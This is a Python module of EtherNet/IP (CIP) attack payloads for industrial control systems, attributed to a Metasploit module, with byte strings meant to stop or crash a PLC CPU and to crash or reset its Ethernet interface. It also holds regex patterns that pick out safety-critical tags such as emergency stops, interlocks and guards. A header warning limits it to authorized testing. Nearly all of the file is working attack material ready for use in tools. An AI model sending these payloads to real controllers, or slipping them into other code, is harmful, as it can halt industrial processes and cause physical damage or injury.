#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EtherNet/IP Attack Payloads

CIP attack payloads from Metasploit DigitalBond multi_cip_command module.
Reference: https://github.com/rapid7/metasploit-framework/blob/master/
           modules/auxiliary/admin/scada/multi_cip_command.rb

WARNING: These payloads are for authorized security testing only.
They can cause physical damage to industrial systems.
"""

# =============================================================================
# CIP Attack Payloads
# =============================================================================

# STOPCPU payload - Sends CPU STOP command to halt PLC execution
# Uses CIP Connection Manager (0x06) Forward Open with embedded command
ATTACK_STOPCPU_PAYLOAD = (
    b"\xb2\x00\x1a\x00\x52\x02\x20\x06\x24\x01\x03\xf0"
    b"\x0c\x00\x07\x02\x20\x02\x24\x01\xf4\xf0\x09\x09"
    b"\x88\x04\xde\xad\xbe\xef\xca\xfe"
)

# CRASHCPU payload - Crashes PLC CPU with malformed CIP message
ATTACK_CRASHCPU_PAYLOAD = (
    b"\xb2\x00\x1a\x00\x52\x02\x20\x06\x24\x01\x03\xf0"
    b"\x0c\x00\x0a\x02\x20\x02\x24\x01\xf4\xf0\x09\x09"
    b"\x88\x04\x01\x00\x01\x00"
)

# CRASHETHER payload - Crashes Ethernet card via malformed TCP/IP Interface write
# Targets TCP/IP Interface Object (0xF5) with invalid attribute write
ATTACK_CRASHETHER_PAYLOAD = b"\xb2\x00\x0c\x00\x0e\x03\x20\xf5\x24\x01\x10\x43\x24\x01\x10\x43"

# RESETETHER payload - Resets Ethernet interface using Reset service (0x05)
# Targets Identity Object (0x01) with Reset service
ATTACK_RESETETHER_PAYLOAD = b"\xb2\x00\x08\x00\x05\x03\x20\x01\x24\x01\x30\x03"

# Dangerous tag patterns for safety analysis
DANGEROUS_TAG_PATTERNS = [
    r".*SAFETY.*",
    r".*ESTOP.*",
    r".*E_STOP.*",
    r".*EMERGENCY.*",
    r".*MOTOR.*ENABLE.*",
    r".*PUMP.*START.*",
    r".*VALVE.*OPEN.*",
    r".*SETPOINT.*",
    r".*SPEED.*CTRL.*",
    r".*PRESSURE.*LIMIT.*",
    r".*GUARD.*",
    r".*INTERLOCK.*",
]

__all__ = [
    "ATTACK_STOPCPU_PAYLOAD",
    "ATTACK_CRASHCPU_PAYLOAD",
    "ATTACK_CRASHETHER_PAYLOAD",
    "ATTACK_RESETETHER_PAYLOAD",
    "DANGEROUS_TAG_PATTERNS",
]
